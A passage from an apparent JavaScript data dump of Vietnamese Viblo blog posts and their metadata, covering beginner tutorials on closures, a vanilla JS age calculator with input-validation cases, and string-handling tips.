nhi\u1ec1u t\u00ednh hu\u1ed1ng \u0111\u1eddi th\u01b0\u1eddng d\u00f9ng \u0111\u1ebfn closure, b\u1ea1n h\u00e3y th\u1eed \u0111\u1ecdc l\u1ea1i Javascript m\u00ecnh \u0111\u00e3 vi\u1ebft xem c\u00f3 ch\u1ed7 n\u00e0o d\u00f9ng \u0111\u1ebfn kh\u00f4ng.  Nhi\u1ec1u ng\u01b0\u1eddi s\u1eed d\u1ee5ng n\u00f3 \u0111\u1ec3 vi\u1ebft c\u00e1c h\u00e0m [`debounce` v\u00e0 `throttle`](https://codeburst.io/throttling-and-debouncing-in-javascript-b01cad5c8edf)\n\n\u0110\u00f3 l\u00e0 nh\u1eefng \u0111i\u1ec1u c\u01a1 b\u1ea3n nh\u1ea5t m\u00e0 m\u00ecnh bi\u1ebft v\u1ec1 Closure. C\u00e1c b\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o th\u00eam \u1edf [\u0111\u00e2y](https://github.com/getify/You-Dont-Know-JS/blob/1st-ed/scope%20%26%20closures/ch5.md) v\u00e0 [\u0111\u00e2y](https://javascript.info/closure) . \nM\u1ed9t \u0111i\u1ec1u th\u00fa v\u1ecb n\u1eefa v\u1edbi v\u00ed d\u1ee5 \u1edf tr\u00ean \n```js\nfor (var i=1; i<=5; i++) {\n\tsetTimeout( function timer(){\n\t\tconsole.log( i );\n\t}, i*1000 );\n}\n```\nL\u00e0 khi b\u1ea1n thay `var` b\u1eb1ng `let`, h\u00e0nh vi kh\u00e1c l\u1ea1i x\u1ea3y ra. B\u1ea1n th\u1eed t\u1ef1 t\u00ecm hi\u1ec3u xem t\u1ea1i sao l\u1ea1i th\u1ebf nh\u00e9.\n\nC\u1ea3m \u01a1n v\u00ec \u0111\u00e3 \u0111\u1ecdc.',
      published_at: "2021-03-12 19:07:32",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 4,
      points: 3,
      views_count: 563,
      clips_count: 1,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/f10632d0-1963-4385-b4d9-050a10fd544c.png",
      user: {
        data: {
          id: 34726,
          url: "https://viblo.asia/u/Nguyen_Tuan_AnhK",
          avatar: "246ed57a-f357-4078-82a7-4fea828f0a3f.jpg",
          name: "Nguyen Tuan Anh K",
          username: "Nguyen_Tuan_AnhK",
          followers_count: 5,
          reputation: 214,
          posts_count: 12,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "beginner",
            name: "Beginner",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Beginner&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "closure",
            name: "closure",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=closure&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 51242,
      title: "Vanilla JS Project: T\u00ednh tu\u1ed5i",
      slug: "oOVlYnen58W",
      url: "https://viblo.asia/p/vanilla-js-project-tinh-tuoi-oOVlYnen58W",
      user_id: 4358,
      moderation: null,
      transliterated: "vanilla-js-project-tinh-tuoi",
      contents_short:
        "1. Y\u00eau c\u1ea7u\nY\u00eau c\u1ea7u b\u00e0i to\u00e1n l\u00e0 ng\u01b0\u1eddi d\u00f9ng nh\u1eadp n\u0103m sinh v\u00e0o \u00f4 input, khi click v\u00e0o button th\u00ec t\u00ednh tu\u1ed5i c\u1ee7a h\u1ecd. \u0110\u00e2y l\u00e0 m\u1ed9t trong nh\u1eefng b\u00e0i t\u1eadp vanilla Javascript \u1edf m\u1ee9c c\u01a1 b\u1ea3n gi\u00fap c\u00e1c b\u1ea1n l\u00e0m quen,...",
      contents:
        '## 1. Y\u00eau c\u1ea7u\nY\u00eau c\u1ea7u b\u00e0i to\u00e1n l\u00e0 ng\u01b0\u1eddi d\u00f9ng nh\u1eadp n\u0103m sinh v\u00e0o \u00f4 input, khi click v\u00e0o button th\u00ec t\u00ednh tu\u1ed5i c\u1ee7a h\u1ecd. \u0110\u00e2y l\u00e0 m\u1ed9t trong nh\u1eefng [b\u00e0i t\u1eadp vanilla Javascript](https://viblo.asia/s/vanilla-javascript-projects-P0lPmryg5ox) \u1edf m\u1ee9c c\u01a1 b\u1ea3n gi\u00fap c\u00e1c b\u1ea1n l\u00e0m quen, ch\u1ee7 y\u1ebfu gi\u1ea3i th\u00edch v\u1ec1 Javascript n\u00ean ph\u1ea7n giao di\u1ec7n s\u1ebd kh\u00f4ng ph\u00e2n t\u00edch nhi\u1ec1u. Hi v\u1ecdng v\u1edbi b\u00e0i t\u1eadp n\u00e0y c\u00e1c b\u1ea1n s\u1ebd th\u1ea5y th\u00edch th\u00fa khi h\u1ecdc Javascript.\n\n![](https://images.viblo.asia/f1e42bfb-edc1-43ed-a318-3181e5399fc1.gif)\n\n## 2. HTML - CSS\n```html\n<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <title>Vanilla JS Project: t\u00ednh tu\u1ed5i</title>\n  <!-- bootstrap css 4.5.0 -->\n  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css" />\n</head>\n<body>\n  <div class="container">\n    <h1 class="mt-5 mb-3">Nh\u1eadp n\u0103m sinh c\u1ee7a b\u1ea1n</h1>\n    <div class="input-group mb-3">\n      <input type="text" class="form-control">\n      <div class="input-group-append">\n        <button class="btn btn-primary">T\u00ednh tu\u1ed5i</button>\n      </div>\n    </div>\n    <p id="result1"></p>\n    <p id="result2"></p>\n    <p id="result3"></p>\n  </div>\n  <script> // code javascript </script>\n</body>\n</html>\n```\n\n## 3. H\u01b0\u1edbng gi\u1ea3i quy\u1ebft ch\u00ednh\n* L\u1ea5y ra n\u0103m hi\u1ec7n t\u1ea1i\n* L\u1ea5y n\u0103m sinh m\u00e0 ng\u01b0\u1eddi d\u00f9ng nh\u1eadp v\u00e0o\n* T\u00ednh tu\u1ed5i = n\u0103m hi\u1ec7n t\u1ea1i - n\u0103m sinh\n* In k\u1ebft qu\u1ea3\n\n## 4. Javascript\n* **Step 1:** \u0110\u1eb7t bi\u1ebfn \u0111\u1ec3 l\u01b0u c\u00e1c th\u1ebb html m\u00ecnh c\u1ea7n, \u1edf \u0111\u00e2y g\u1ed3m c\u00f3 input \u0111\u1ec3 l\u1ea5y n\u0103m sinh, button \u0111\u1ec3 click v\u00e0 c\u00e1c th\u1ebb html \u0111\u1ec3 in k\u1ebft qu\u1ea3\n* **Step 2:** L\u1eafng nghe s\u1ef1 ki\u1ec7n click c\u1ee7a th\u1ebb button\n* **Step 3:** L\u1ea5y ra n\u0103m hi\u1ec7n t\u1ea1i `(currentYear)`\n* **Step 4:** L\u1ea5y n\u0103m sinh ng\u01b0\u1eddi d\u00f9ng nh\u1eadp v\u00e0o `(birthYear)`, l\u01b0u \u00fd nh\u1eefng gi\u00e1 tr\u1ecb n\u00e0y l\u00e0 string n\u00ean c\u1ea7n chuy\u1ec3n sang number\n* **Step 5:** T\u00ednh tu\u1ed5i = `currentYear - birthYear`\n* In k\u1ebft qu\u1ea3\n* D\u01b0\u1edbi \u0111\u00e2y l\u00e0 to\u00e0n b\u1ed9 code JS\n```js\n// step 1\nconst ipnElement     = document.querySelector(\'input\')\nconst btnElement     = document.querySelector(\'button\')\nconst resultElement1 = document.querySelector(\'#result1\')\nconst resultElement2 = document.querySelector(\'#result2\')\nconst resultElement3 = document.querySelector(\'#result3\')\n\n// step 2\nbtnElement.addEventListener(\'click\', function() {\n  // step 3\n  const currentYear = new Date().getFullYear()\n  // step 4\n  const birthYear = Number(ipnElement.value)\n  // step 5\n  const age = currentYear - birthYear\n  // step 6\n  resultElement1.innerHTML = `N\u0103m hi\u1ec7n t\u1ea1i: ${currentYear}`\n  resultElement2.innerHTML = `N\u0103m sinh: ${birthYear}`\n  resultElement3.innerHTML = `Tu\u1ed5i c\u1ee7a b\u1ea1n: ${currentYear} - ${birthYear} = ${age} tu\u1ed5i`\n})\n```\n## 5. Y\u00eau c\u1ea7u n\u00e2ng cao\n\u1ede tr\u00ean c\u01a1 b\u1ea3n ch\u00fang ta \u0111\u00e3 gi\u1ea3i quy\u1ebft xong b\u00e0i to\u00e1n nh\u01b0ng v\u1eabn c\u00f2n nhi\u1ec1u th\u1ee9 c\u1ea7n \u0111\u01b0\u1ee3c hen \u0111\u1ed3 (handle)\n\n**Bug 1:**\n- N\u0103m hi\u1ec7n t\u1ea1i: 2020\n- Input: kh\u00f4ng nh\u1eadp g\u00ec c\u1ea3 v\u00e0 click lu\u00f4n v\u00e0o button\n- K\u1ebft qu\u1ea3: **2020 - NaN = NaN tu\u1ed5i**\n- Nguy\u00ean nh\u00e2n: ng\u01b0\u1eddi d\u00f9ng kh\u00f4ng nh\u1eadp gi\u00e1 tr\u1ecb g\u00e2y ra l\u1ed7i\n- Mong \u0111\u1ee3i k\u1ebft qu\u1ea3: **Vui l\u00f2ng nh\u1eadp n\u0103m sinh c\u1ee7a b\u1ea1n.**\n\n**Bug 2:**\n- N\u0103m hi\u1ec7n t\u1ea1i: 2020\n- Nh\u1eadp input: **3000**\n- K\u1ebft qu\u1ea3: **2020 - 3000 = -980 tu\u1ed5i**\n- Nguy\u00ean nh\u00e2n: n\u0103m sinh ng\u01b0\u1eddi d\u00f9ng nh\u1eadp v\u00e0o l\u1edbn h\u01a1n n\u0103m hi\u1ec7n t\u1ea1i g\u00e2y ra l\u1ed7i\n- Mong \u0111\u1ee3i k\u1ebft qu\u1ea3: **N\u0103m sinh kh\u00f4ng \u0111\u01b0\u1ee3c l\u1edbn h\u01a1n n\u0103m hi\u1ec7n t\u1ea1i, vui l\u00f2ng nh\u1eadp l\u1ea1i.**\n\n\n**Bug 3:**\n- N\u0103m hi\u1ec7n t\u1ea1i: 2020\n- Nh\u1eadp input: **-1000**\n- K\u1ebft qu\u1ea3: **2020 - - 1000 = 3020 tu\u1ed5i**\n- Nguy\u00ean nh\u00e2n: n\u0103m sinh ng\u01b0\u1eddi d\u00f9ng nh\u1eadp v\u00e0o l\u00e0 s\u1ed1 \u00e2m\n- Mong \u0111\u1ee3i k\u1ebft qu\u1ea3: **N\u0103m sinh kh\u00f4ng \u0111\u01b0\u1ee3c nh\u1ecf h\u01a1n 0, vui l\u00f2ng nh\u1eadp l\u1ea1i.**\n\n\n**Bug 4:**\n- N\u0103m hi\u1ec7n t\u1ea1i: 2020\n- Nh\u1eadp input: **1020**\n- K\u1ebft qu\u1ea3: **2020 - 1020 = 1000 tu\u1ed5i**\n- Nguy\u00ean nh\u00e2n: theo \u00fd ki\u1ebfn ch\u1ee7 quan c\u1ee7a m\u00ecnh th\u00ec ch\u01b0a th\u1ea5y ai tr\u00ean 150 tu\u1ed5i c\u1ea3 n\u00ean tr\u01b0\u1eddng h\u1ee3p n\u00e0y cho v\u00e0o l\u1ed7i\n- Mong \u0111\u1ee3i k\u1ebft qu\u1ea3: **H\u1ec7 th\u1ed1ng ch\u1ec9 ghi nh\u1eadn ng\u01b0\u1eddi t\u1ed1i \u0111a l\u00e0 150 tu\u1ed5i, vui l\u00f2ng nh\u1eadp l\u1ea1i.**\n\n**Bug 5:**\n- N\u0103m hi\u1ec7n t\u1ea1i: 2020\n- Nh\u1eadp input: **kentrung**\n- K\u1ebft qu\u1ea3: **2021 - NaN = NaN tu\u1ed5i**\n- Nguy\u00ean nh\u00e2n: ng\u01b0\u1eddi d\u00f9ng nh\u1eadp kh\u00f4ng \u0111\u00fang \u0111\u1ecbnh d\u1ea1ng\n- Mong \u0111\u1ee3i k\u1ebft qu\u1ea3: **N\u0103m sinh kh\u00f4ng \u0111\u00fang \u0111\u1ecbnh d\u1ea1ng, vui l\u00f2ng nh\u1eadp l\u1ea1i.**\n\n\n**Bug n: ...**\n\nN\u00f3i chung \u1edf step 4 ch\u00fang ta m\u1edbi ch\u1ec9 l\u1ea5y d\u1eef li\u1ec7u t\u1eeb input v\u00e0 chuy\u1ec3n n\u00f3 th\u00e0nh ki\u1ec3u number \u0111\u1ec3 t\u00ednh to\u00e1n, s\u1ebd c\u1ea7n c\u00f3 step 4.5 l\u00e0m nhi\u1ec7m v\u1ee5 ki\u1ec3m tra t\u00ednh h\u1ee3p l\u1ec7 c\u1ee7a d\u1eef li\u1ec7u, kh\u00f4ng n\u00ean tin b\u1ea5t c\u1ee9 c\u00e1i g\u00ec ng\u01b0\u1eddi d\u00f9ng nh\u1eadp v\u00e0o, \u0111\u1ee7 c\u00e1c th\u1ee9 linh tinh h\u1ed5 l\u1ed1n, tr\u00ean r\u1eafn d\u01b0\u1edbi n\u00e1t, th\u1eadp c\u1ea9m l\u00f2ng m\u1ec1... Tr\u01b0\u1eddng h\u1ee3p nh\u1eadp \u0111\u00fang n\u0103m ch\u1ec9 l\u00e0 happy case m\u00e0 th\u00f4i.\n\n-----\n\nB\u00e0i vi\u1ebft \u0111\u1ebfn \u0111\u00e2y l\u00e0 h\u1ebft, hi v\u1ecdng v\u1edbi b\u00e0i vi\u1ebft n\u00e0y c\u00e1c b\u1ea1n \u0111\u00e3 th\u00eam \u0111\u01b0\u1ee3c nhi\u1ec1u ki\u1ebfn th\u1ee9c b\u1ed5 \u00edch. H\u1eb9n g\u1eb7p l\u1ea1i c\u00e1c b\u1ea1n \u1edf b\u00e0i vi\u1ebft ti\u1ebfp theo!\n\n* Demo online: https://project-js-tinh-tuoi.kentrung.repl.co/\n* Code online: https://repl.it/@kentrung/Project-JS-Tinh-tuoi\n* Series vanilla javascript projects: https://viblo.asia/s/vanilla-javascript-projects-P0lPmryg5ox',
      published_at: "2021-03-11 09:05:33",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 4,
      points: 3,
      views_count: 227,
      clips_count: 0,
      comments_count: 1,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/f1e42bfb-edc1-43ed-a318-3181e5399fc1.gif",
      user: {
        data: {
          id: 4358,
          url: "https://viblo.asia/u/trungnt256",
          avatar: "92fef404-c589-43f0-a92f-21c78c7737ef.jpg",
          name: "kentrung",
          username: "trungnt256",
          followers_count: 22,
          reputation: 655,
          posts_count: 30,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "html",
            name: "HTML",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=HTML&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "css",
            name: "CSS",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=CSS&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "vanilla-js",
            name: "vanilla js",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=vanilla+js&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 43976,
            url: "https://viblo.asia/u/tuannd1",
            avatar: "c99821b4-3c27-4a5a-aa34-1b0bc9f06a60.jpg",
            name: "Tu\u1ea5n Nguy\u1ec5n",
            username: "tuannd1",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 50150,
      title:
        "B\u1ea1n \u0111\u00e3 bi\u1ebft c\u00e1c tips n\u00e0y khi l\u00e0m vi\u1ec7c v\u1edbi chu\u1ed7i trong JavaScript ch\u01b0a ?",
      slug: "maGK70naZj2",
      url:
        "https://viblo.asia/p/ban-da-biet-cac-tips-nay-khi-lam-viec-voi-chuoi-trong-javascript-chua-maGK70naZj2",
      user_id: 29859,
      moderation: null,
      transliterated:
        "ban-da-biet-cac-tips-nay-khi-lam-viec-voi-chuoi-trong-javascript-chua",
      contents_short:
        "Hi xin ch\u00e0o c\u00e1c b\u1ea1n, ti\u1ebfp t\u1ee5c chu\u1ed7i ch\u1ee7 \u0111\u1ec1 v\u1ec1 c\u00e1i th\u1eb1ng JavaScript n\u00e0y, h\u00f4m nay m\u00ecnh s\u1ebd gi\u1edbi thi\u1ec7u cho c\u00e1c b\u1ea1n m\u1ed9t s\u1ed1 th\u1ee7 thu\u1eadt hay ho khi l\u00e0m vi\u1ec7c v\u1edbi chu\u1ed7i trong JavaScript c\u00f3 th\u1ec3 b\u1ea1n \u0111\u00e3 ho\u1eb7c ch\u01b0...",
      contents:
        'Hi xin ch\u00e0o c\u00e1c b\u1ea1n, ti\u1ebfp t\u1ee5c chu\u1ed7i ch\u1ee7 \u0111\u1ec1 v\u1ec1 c\u00e1i th\u1eb1ng JavaScript n\u00e0y, h\u00f4m nay m\u00ecnh s\u1ebd gi\u1edbi thi\u1ec7u cho c\u00e1c b\u1ea1n m\u1ed9t s\u1ed1 th\u1ee7 thu\u1eadt hay ho khi l\u00e0m vi\u1ec7c v\u1edbi chu\u1ed7i trong JavaScript c\u00f3 th\u1ec3 b\u1ea1n \u0111\u00e3 ho\u1eb7c ch\u01b0a t\u1eebng d\u00f9ng. C\u1ee5 th\u1ec3 nh\u01b0 n\u00e0o th\u00ec h\u00e3y c\u00f9ng m\u00ecnh t\u00ecm hi\u1ec3u trong b\u00e0i vi\u1ebft n\u00e0y nh\u00e9 (go)\n\n![](https://images.viblo.asia/6611729b-963a-4846-9fd5-0f74804be878.png)\n\n### 1. Sao ch\u00e9p m\u1ed9t chu\u1ed7i nhi\u1ec1u l\u1ea7n\n\nThay v\u00ec ph\u1ea3i g\u00f5 1 chu\u1ed7i l\u1eb7p \u0111i l\u1eb7p l\u1ea1i th\u00ec b\u1ea1n c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng method `.repeat()`.\n\nPh\u01b0\u01a1ng th\u1ee9c `repeat()` x\u00e2y d\u1ef1ng v\u00e0 tr\u1ea3 v\u1ec1 m\u1ed9t chu\u1ed7i m\u1edbi ch\u1ee9a s\u1ed1 l\u01b0\u1ee3ng nh\u1ea5t \u0111\u1ecbnh b\u1ea3n sao ch\u00e9p c\u1ee7a chu\u1ed7i \u0111\u01b0\u1ee3c g\u1ecdi t\u1edbi v\u00e0 n\u1ed1i chung v\u1edbi nhau.\n\n```js\nconst laughing = "ha".repeat(3);\nconsole.log(laughing); // "hahaha"\n```\n\n### 2. Ch\u00e8n th\u00eam k\u00fd t\u1ef1 v\u00e0o chu\u1ed7i v\u1edbi m\u1ed9t \u0111\u1ed9 d\u00e0i c\u1ee5 th\u1ec3 cho tr\u01b0\u1edbc\n\nTr\u01b0\u1eddng h\u1ee3p n\u00e0y b\u1ea1n s\u1ebd th\u01b0\u1eddng hay g\u1eb7p n\u1ebfu mu\u1ed1n m\u00e3 ho\u00e1 s\u1ed1 \u0111i\u1ec7n tho\u1ea1i ho\u1eb7c m\u00e3 th\u1ebb b\u1eb1ng vi\u1ec7c s\u1eed d\u1ee5ng 2 method `padStart()` v\u00e0 `padEnd()`. C\u1ee5 th\u1ec3 b\u1ea1n quan s\u00e1t v\u00ed d\u1ee5 sau \u0111\u1ec3 h\u00ecnh dung ra ch\u1ee9c n\u0103ng c\u1ee7a n\u00f3\n\n```js\n// th\u00eam d\u1ea5u * t\u00ednh t\u1eeb \u0111\u1ea7u chu\u1ed7i cho \u0111\u1ebfn khi \u0111\u1ee7 8 k\u00fd t\u1ef1\nconst eightBitsStart = "001".padStart(8, "*");\nconsole.log(eightBitsStart); // "*****001"\n\n// th\u00eam d\u1ea5u * t\u00ednh t\u1eeb cu\u1ed1i chu\u1ed7i cho \u0111\u1ebfn khi \u0111\u1ee7 8 k\u00fd t\u1ef1\nconst eightBitsEnd = "001".padEnd(8, "*");\nconsole.log(eightBitsEnd); // "001*****"\n```\n\n### 3. Bi\u1ebfn string th\u00e0nh array\n\nS\u1eed d\u1ee5ng `spread operator` gi\u00fap b\u1ea1n c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng bi\u1ebfn string th\u00e0nh array trong 1 n\u1ed1t nh\u1ea1c\n\n```js\nconst word = "apple";\nconst characters = [...word];\nconsole.log(characters); // ["a", "p", "p", "l", "e"]\n```\n\n### 4. \u0110\u1ebfm s\u1ed1 k\u00fd t\u1ef1 trong chu\u1ed7i\n\nR\u1ea5t \u0111\u01a1n gi\u1ea3n, s\u1eed d\u1ee5ng `length` l\u00e0 xong\n```js\nconst word = " apple ";\nconsole.log(word.length); // 7\n```\n\u00c0 m\u00e0 t\u1eeb t\u1eeb quay xe \u0111\u00e3, sao n\u00f3 l\u1ea1i ra nh\u01b0 n\u00e0y nh\u1ec9 =))\n\n```js\nconst word = "\ud867\ude3d";\nconsole.log(word.length); // 2\n```\n\nC\u00f3 th\u1ec3 gi\u1ea3i th\u00edch nh\u01b0 sau: JS \u0111\u1ea1i di\u1ec7n cho h\u1ea7u h\u1ebft c\u00e1c k\u00fd t\u1ef1 d\u01b0\u1edbi d\u1ea1ng \u0111i\u1ec3m m\u00e3 16 bit. Tuy nhi\u00ean, m\u1ed9t s\u1ed1 k\u00fd t\u1ef1 nh\u1ea5t \u0111\u1ecbnh \u0111\u01b0\u1ee3c bi\u1ec3u di\u1ec5n d\u01b0\u1edbi d\u1ea1ng hai (ho\u1eb7c nhi\u1ec1u) \u0111i\u1ec3m m\u00e3 16 bit, \u0111\u01b0\u1ee3c g\u1ecdi l\u00e0 c\u00e1c c\u1eb7p thay th\u1ebf . N\u1ebfu b\u1ea1n \u0111ang s\u1eed d\u1ee5ng `length`, JS s\u1ebd cho b\u1ea1n bi\u1ebft c\u00f3 bao nhi\u00eau \u0111i\u1ec3m m\u00e3 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng. Do \u0111\u00f3, n\u00f3 \ud867\ude3d bao g\u1ed3m hai \u0111i\u1ec3m m\u00e3 v\u00e0 tr\u1ea3 v\u1ec1 m\u1ed9t gi\u00e1 tr\u1ecb kh\u00f4ng ch\u00ednh x\u00e1c.\n\n\u0110\u1ec3 gi\u1ea3i quy\u1ebft v\u1ea5n \u0111\u1ec1 n\u00e0y, b\u1ea1n s\u1ebd c\u1ea7n nh\u00e9t n\u00f3 v\u00e0o array v\u00e0 l\u1ea5y length c\u1ee7a array\n\n```js\nconst word = "\ud867\ude3d";\nconst characters = [...word];\nconsole.log(characters.length); // 1\n```\n\n### 5. \u0110\u1ea3o ng\u01b0\u1ee3c m\u1ed9t chu\u1ed7i\n\nC\u0169ng l\u1ea1i c\u1ea7n \u0111\u1ebfn anh array n\u00e0y 1 ch\u00fat =))\n\n```js\nconst word = "apple";\nconst reversedWord = [...word].reverse().join("");\nconsole.log(reversedWord); // "elppa"\n```\n\n### 6. Vi\u1ebft hoa ch\u1eef c\u00e1i \u0111\u1ea7u\n\n\u0110\u1ec3 l\u00e0m \u0111\u01b0\u1ee3c \u0111i\u1ec1u n\u00e0y th\u00ec CSS ch\u1ec9 c\u1ea7n 1 d\u00f2ng, c\u00f2n JS th\u00ec c\u1ea7n m\u1ea5y d\u00f2ng \u0111\u00e2y\n\n```js\nlet word = "apple";\nword = word[0].toUpperCase() + word.substr(1);\nconsole.log(word); // "Apple"\n```\n\nC\u00e1ch d\u00e0i h\u01a1n nh\u01b0ng an to\u00e0n h\u01a1n (b\u1ea1n c\u00f3 th\u1ec3 xem l\u1ea1i **#4** \u0111\u1ec3 hi\u1ec3u issue)\n\n```js\nlet word = "apple";\nconst characters = [...word];\ncharacters[0] = characters[0].toUpperCase();\nword = characters.join("");\n\nconsole.log(word); // "Apple"\n```\n\n### 7. Vi\u1ebft hoa ch\u1eef c\u00e1i \u0111\u1ea7u ti\u00ean c\u1ee7a m\u1ed7i t\u1eeb\n\n```js\nconst capitalizeEveryWord = str => str.replace(/\\b[a-z]/g, char => char.toUpperCase());\n\ncapitalizeEveryWord(\'hello world!\'); // "Hello World!"\n```\n\n### 8. Chia nh\u1ecf chu\u1ed7i d\u1ef1a theo m\u1ed9t nh\u00f3m k\u00fd t\u1ef1\n\n\u0110\u1ec3 l\u00e0m \u0111\u01b0\u1ee3c \u0111i\u1ec1u n\u00e0y b\u1ea1n s\u1ebd c\u1ea7n k\u1ebft h\u1ee3p `split()` v\u00e0 bi\u1ec3u th\u1ee9c regex \u0111\u1ec3 x\u00e1c \u0111\u1ecbnh s\u1ebd chia chu\u1ed7i theo nh\u00f3m k\u00fd t\u1ef1 n\u00e0o.\n\nXem v\u00ed d\u1ee5 sau \u0111\u1ec3 hi\u1ec3u r\u00f5 h\u01a1n\n\n```js\nconst list = "apples,bananas;cherries";\nconst fruits = list.split(/[,;]/); // chia chu\u1ed7i d\u1ef1a tr\u00ean "," v\u00e0 ";"\nconsole.log(fruits); // ["apples", "bananas", "cherries"]\n```\n\n### 9. Ki\u1ec3m tra s\u1ef1 t\u1ed3n t\u1ea1i c\u1ee7a "chu\u1ed7i trong chu\u1ed7i"\n\nR\u1ea5t \u0111\u01a1n gi\u1ea3n, b\u1ea1n c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng `includes()`\n\n```js\nconst text = "Hello, world! My name is Kai!"\nconsole.log(text.includes("Kai")); // true\n```\n\n### 10. Ki\u1ec3m tra chu\u1ed7i b\u1eaft \u0111\u1ea7u/k\u1ebft th\u00fac b\u1eb1ng 1 chu\u1ed7i\n\n```js\nconst text = "Hello, world! My name is Kai!"\nconsole.log(text.startsWith("Hello")); // true\nconsole.log(text.endsWith("world")); // false\n```\n\n### 11. Thay th\u1ebf to\u00e0n b\u1ed9 s\u1ef1 xu\u1ea5t hi\u1ec7n c\u1ee7a t\u1eeb trong chu\u1ed7i\n\nKhi nghe \u0111\u1ebfn b\u00e0i to\u00e1n n\u00e0y \u0111a ph\u1ea7n ch\u00fang ta s\u1ebd ngh\u0129 \u0111\u1ebfn regex d\u1ea1ng\n\n```js\nconst text = "I like apples. You like apples."\n\nconsole.log(text.replace(/apples/g, "bananas"));\n// "I like bananas. You like bananas."\n```\n\nTuy nhi\u00ean, trong c\u00e1c string method c\u0169ng c\u00f3 1 method l\u00e0m \u0111\u01b0\u1ee3c \u0111i\u1ec1u t\u01b0\u01a1ng t\u1ef1\n\n```js\nconst text = "I like apples. You like apples."\n\nconsole.log(text.replaceAll("apples", "bananas"));\n// "I like bananas. You like bananas."\n```\n\n### 12. Xo\u00e1 th\u1ebb HTML ra kh\u1ecfi chu\u1ed7i\n\n```js\nconst stripHTMLTags = str => str.replace(/<[^>]*>/g, \'\');\n\nstripHTMLTags(\'<p><em>lorem</em> <strong>ipsum</strong></p>\'); // \'lorem ipsum\'\n```\n\n### 13. S\u1eafp x\u1ebfp c\u00e1c k\u00fd t\u1ef1 trong chu\u1ed7i theo th\u1ee9 t\u1ef1 b\u1ea3ng ch\u1eef c\u00e1i\n\n```js\nconst sortCharactersInString = str => [...str].sort((a, b) => a.localeCompare(b)).join(\'\');\n\nsortCharactersInString(\'cabbage\'); // \'aabbceg\'\n```\n\n### K\u1ebft lu\u1eadn\nTr\u00ean \u0111\u00e2y l\u00e0 1 v\u00e0i \u0111o\u1ea1n snippet nho nh\u1ecf nh\u01b0ng c\u00f3 v\u00f5 m\u00ecnh tin r\u1eb1ng s\u1ebd gi\u00fap \u00edch cho b\u1ea1n r\u1ea5t nhi\u1ec1u trong qu\u00e1 tr\u00ecnh l\u00e0m vi\u1ec7c v\u1edbi js.\n\nN\u1ebfu th\u1ea5y b\u00e0i vi\u1ebft hay, h\u00e3y cho m\u00ecnh +1 upvote nh\u00e9. N\u1ebfu th\u00edch m\u00ecnh h\u00e3y nh\u1ea5n n\u00fat follow \u0111\u1ec3 bi\u1ebft th\u00eam nhi\u1ec1u th\u1ee9 hay ho h\u01a1n. Ch\u00fac b\u1ea1n th\u00e0nh c\u00f4ng !',
      published_at: "2021-03-02 07:47:37",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: "2021-03-12 11:11:03",
      promoted_at: null,
      reading_time: 4,
      points: 15,
      views_count: 965,
      clips_count: 13,
      comments_count: 4,
      rated_value: null,
      promoted: false,
      trending: true,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/6611729b-963a-4846-9fd5-0f74804be878.png",
      user: {
        data: {
          id: 29859,
          url: "https://viblo.asia/u/hunghoangvan",
          avatar: "8cdc2656-eb3c-46b2-8145-3ebd795cad12.jpg",
          name: "Hoang Van Hung",
          username: "hunghoangvan",
          followers_count: 49,
          reputation: 1604,
          posts_count: 23,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "front-end",
            name: "Front-end",
